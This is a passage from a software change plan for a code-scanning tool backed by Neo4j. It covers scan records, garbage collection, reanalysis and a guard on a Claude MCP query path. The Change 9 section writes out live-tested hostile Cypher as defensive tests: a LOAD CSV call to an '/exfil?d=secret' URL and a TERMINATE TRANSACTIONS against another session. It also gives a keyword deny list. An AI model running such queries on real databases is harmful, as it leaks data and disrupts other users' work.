  The old "used as-is" warning goes away.
- `orion gc --keep N [--prefix P] [--dry-run]` per D6, using `delete_scan(..., SCAN_LABELS)`.
  Prints each deleted scan_id with per-label counts.
- `OrionScan` is not added to NODE_KEY. `GraphDB.schema()` drops rows whose `nodeLabels` contain
  `OrionScan`.

**Invariant risk.** get_schema: guarded by T6.4. Isolation: the record is keyed by scan_id. Default
output: refusals only on `--scan-id`. Existing `test_cli_engine` stubs gain a scan-record stub (no
assertion changes).

**Tests** (`tests/test_scan_record.py`, live, `test-<uuid>-*`). Builds use the real `build()` with
`joern_adapter.export_repo` replaced by a fixed tiny envelope: Joern isn't under test.

- **T6.1 `test_build_records_building_then_complete`**. A spy wrapping the real `persist._clear`
  reads the record from Neo4j when the clear starts → `building`. After build → `complete`, with
  commit/profile/version/built_at set and `json.loads(counts)` equal to the persist counts.
  - Catches: no record at all.
  - Fails today: `AssertionError: no OrionScan record for test-…`.
  - Doesn't cover: embed/runtime stages (they run after `complete`).
- **T6.2 `test_crashed_build_stays_building`**. Fault injection: `persist._edge_jobs` raises. Build
  raises; record `building`; `cli.main(["scan","--scan-id",sid,"--quiet"])` == 2 with "incomplete"
  on stderr, discovery never called (stub fails the test if called).
  - Catches: `cli.py:97-98` accepting a half-loaded partition.
  - Fails today: no record + rc 0.
- **T6.3 `test_scan_id_refuses_wrong_profile_and_unrecorded`**. Records: complete `express`,
  complete `express+lm`, and none. Expected rc 2 for: (express, `--engine lm`), (express+lm,
  claude), (unrecorded, claude). Expected rc 0 for (express, claude) with discovery stubbed.
  - Fails today: rc 0 for all.
  - Doesn't cover: a profile renamed in code later (would refuse; rebuild).
- **T6.4 `test_scan_record_is_invisible_to_get_schema`**. get_schema before; create an OrionScan
  node with raw Cypher in the documented shape; get_schema after == before and no `OrionScan` label.
  - Catches: `graphdb.py:117-129` reflecting every label.
  - Fails today: `AssertionError: OrionScan leaked into get_schema`.
- **T6.5 `test_gc_keeps_newest_and_ignores_others`**. Three recorded scans `test-<u>-1..3` (built in
  sequence), one unrecorded `test-<u>-x`, one recorded `test-<v>-y` (other prefix).
  `cli.main(["gc","--keep","1","--prefix",f"test-{u}"])` leaves `-3` intact; `-1`,`-2` gone in every
  `SCAN_LABELS` label; `-x` and `test-<v>-y` intact. `--dry-run` first deletes nothing.
  - Fails today: `SystemExit: 2` (argparse `invalid choice: 'gc'`).
  - Doesn't cover: gc concurrent with a build.

## Change 7 — reanalyze without Joern; precompute never fatal

**Evidence.** No subcommand (help output above). `graph_build.py:144-167`: a `pathfind` that raises
aborts `build()` before persist. Measured with a cached envelope: `build raised: RuntimeError
pathfind exploded`, even though the comment at :147 says "never fatal".

**Fix.**
- `reanalyze.reanalyze(scan_id, engine=None) -> dict` (gated like `--scan-id`; engine must agree
  with the record, D3):
  1. Load into a `schema.Batch(scan_id)`: CpgCall nodes (all props), FLOWS_TO (`arg_index`),
     ENTERS_AT and CONTAINS_CALL from Neo4j, scan_id on both endpoints.
  2. Run `pathfind(batch, profile)` with the record's profile rebuilt from current code
     (`EXPRESS`/`GENERIC`, `+lm` → `with_lm_sinks`).
  3. Mark the record `building`, then `delete_scan(..., ["CandidateFlow"])`.
  4. CREATE the new CandidateFlows through persist's node job path (counter-checked, change 2).
  5. Mark the record `complete` with updated counts + `reanalyzed_at`.
- `orion reanalyze --scan-id X [--engine claude|lm]`.
- `build()`: each of reachability / centrality / pathfind in its own try/except. On error: a
  `build`/`error` event, the failure noted in record counts, and the build continues (`pathfind`
  builds its node list before appending, so a failure adds no partial CandidateFlows).

**Invariant risk.** FLOWS_TO: read-only here. Default output: none unless a precompute step raises
(today that aborts the scan). Isolation: every load/delete is `{scan_id:$sid}` on each labeled node.

**Tests.**

- **T7.1 `tests/test_reanalyze.py::test_reanalyze_restores_flows_and_touches_nothing_else`** (not
  slow; live). Synthetic batch with sources, a diamond and two sinks. Precompute minus pathfind is
  persisted into `test-<uuid>` + a complete record. `cli.main(["reanalyze","--scan-id",sid])`, then:
  CandidateFlow snapshot from Neo4j == in-process `pathfind` on the original batch, and per-label /
  per-type counts other than CandidateFlow are unchanged.
  - Catches: no way to recompute flows.
  - Fails today: `SystemExit: 2` (`invalid choice: 'reanalyze'`).
  - Doesn't cover: centrality/reachability recompute (pathfind reads the persisted values).
- **T7.2 `…::test_reanalyze_refuses_incomplete_or_mismatched`**. `building` record → refused; claude
  scan + `--engine lm` → refused (D3); nothing deleted.
  - Fails today: invalid choice.
- **T7.3 `…::test_nodegoat_reanalyze_equals_build`** (slow). Stream build into `test-<uuid>` →
  snapshot → reanalyze → snapshot equal (and equal to the golden).
  - Fails today: invalid choice.
- **T7.4 `tests/test_graph_build.py`-style `test_precompute_failure_is_not_fatal`** (live, stub
  envelope; `pathfind.pathfind` replaced by a raiser = fault injection, not the unit under test).
  `build()` returns the scan_id; a `build`/`error` event names pathfind; CpgCall nodes persisted, 0
  CandidateFlow; record `complete` with `precompute.pathfind` error in counts.
  - Catches: `graph_build.py:144-167`.
  - Fails today: `RuntimeError: pathfind exploded` (measured).

## Change 9 — Claude MCP query path

**Evidence (live, through `mcp_server.run_cypher_impl`, 2026-10-18).**
- `LOAD CSV FROM 'http://host.docker.internal:<port>/exfil?d=secret'` → returned 2 rows and **the
  local HTTP server received `/exfil?d=secret`**. The Neo4j server fetched an attacker-chosen URL;
  the query string can carry data out.
- `SHOW TRANSACTIONS` → listed transactions (ids, current query text).
- `TERMINATE TRANSACTIONS '<id of another session's open tx>'` → `Transaction terminated.`; the
  victim's next statement failed with `Neo.ClientError.Transaction.Terminated`.
- `CALL dbms.components()` → `Neo4j Kernel 5.26.28`; `CALL db.labels()` → 11 rows.
- `USE neo4j MATCH (n:CpgFile) RETURN count(n)` → 5691.
- All of this ran inside the READ-access session from 515225b.
- No discovery/verify prompt tells agents to use CALL/USE/LOAD/SHOW/TERMINATE (grep).

**Fix.** `run_cypher_impl` first runs `graphdb.blank(query)` (strings, comments and backticks
blanked by the shared lexer), then tests the `orion.lm.tools._FORBIDDEN` / `_FORBIDDEN_RE` entries
for exactly `LOAD`, `SHOW`, `TERMINATE`, `USE`, `CALL`. Selection is by word, by import; tools.py is
untouched. Returns `{"error": <tools' message>}` without calling GraphDB. UNION/FOREACH and the lm
scan-scope rule are deliberately NOT added.

**Invariant risk.** Claude queries that put these words outside strings are refused. None of the
prompts use them; a stray `n.use` property would false-positive (accepted, as in tools.py). No
network: the T9 server binds 127.0.0.1 and Neo4j reaches it via Docker Desktop's
`host.docker.internal` (loopback, not the internet).

**Tests** (`tests/test_mcp_clause_guard.py`, live).

- **T9.1 `test_load_csv_is_refused_before_neo4j_fetches`**. Control: the same LOAD CSV through a
  plain harness session must reach the local server (else skip: channel unavailable). Then
  `run_cypher_impl(...)` → `error` mentions LOAD CSV, and the server got 0 new requests.
  - Catches: MCP path → `graphdb.py:143-148` passes LOAD CSV.
  - Fails today: `AssertionError: Neo4j fetched ['/exfil?d=secret']`.
  - Doesn't cover: `file:///` URLs (refused by the same keyword rule, not separately tested).
- **T9.2 `test_terminate_is_refused_before_neo4j_runs_it`**. Hold an open tx in another session; MCP
  `TERMINATE TRANSACTIONS '<its id>'` → error; the held tx then commits.
  - Fails today: `ClientError: Neo.ClientError.Transaction.Terminated`.
- **T9.3 `test_show_use_call_are_refused`** (parametrized over the three measured queries). Each
  returns an error containing tools' message.
  - Fails today: rows returned (measured counts above).
- **T9.4 `test_keywords_inside_strings_and_unscoped_reads_still_run`** (guard).
  `WHERE c.code CONTAINS 'LOAD CSV' OR c.name = 'call'` and an unscoped `MATCH (n:CpgFile) RETURN
  count(n)` both return rows (no lm scope rule on this path).
  - Fails today: n/a (guard).

---

## Phase 3 — whole-branch verification

1. `./.venv/bin/pytest -m "not slow" -q` and `./.venv/bin/pytest eval/tests -q`. Compare with
   baseline 369 passed / 2 skipped and 190 passed.
2. Slow parity + new slow tests: `tests/test_stream_build.py`, `tests/test_taint_summary.py`,
   `tests/test_graphdb_readonly_live.py`, and every new slow test above. **Not** run:
   `test_discover_parse::test_one_shape_live`, `test_verifier_rejects_bad_lead` (Claude tokens),
   `test_lm_model` (MLX model), `test_runtime_live` (executes NodeGoat, needs mongo). Say if you
   want any of them.
3. Determinism end to end (D5): `graph_build.build("fixtures/NodeGoat", stream=True, queue_size=64,
   on_batch=<embed>, scan_id="test-<u>-s0")` under `PYTHONHASHSEED=0`, again as `-s3` under `=3`.
   `graph_snapshot.from_neo4j` row-by-row diff (expect 0 added / 0 missing) plus per-call centrality.
4. `orion reanalyze --scan-id test-<u>-s0` → snapshot vs the build-time snapshot (expect identical).
5. `orion gc --keep 1 --prefix test-<u> --dry-run`, then for real. Then `clear_scan` the survivor.
   Confirm with a label-less count that `test-<u>-*` is gone and the 38 pre-existing scans still
   exist.
6. `get_schema` vs `get_schema_before.json` (expect equal).
7. FLOWS_TO: `test_stream_flows_parity` (217); PyGoat 1075 per D1.

## Report-back format

Table: change | commit | test(s) | red output | green output. Suite counts before/after; measured
FLOWS_TO / CandidateFlow / CpgParameter numbers; anything stopped on or not done.

## Self-review

- Every brief item maps to a change section and tests. The determinism + snapshot request is T1.1–T1.5.
- Change 8 and the guards (T1.5, T4.2/4.3/4.5, T9.4) pass before any fix by design; each is
  labelled, with how its red is shown or why none exists.
- Names used across tasks: `scans.SCAN_LABELS`, `scans.delete_scan`, `scans.mark_building`,
  `scans.mark_complete`, `scans.check_usable`, `persist.PersistMismatch`,
  `config.persist_strict()`, `graph_build._persist_warning`, `scan_id_for(repo, profile=None)`,
  `reanalyze.reanalyze(scan_id, engine=None)`, `tests/graph_snapshot.from_batch/from_neo4j/diff`.
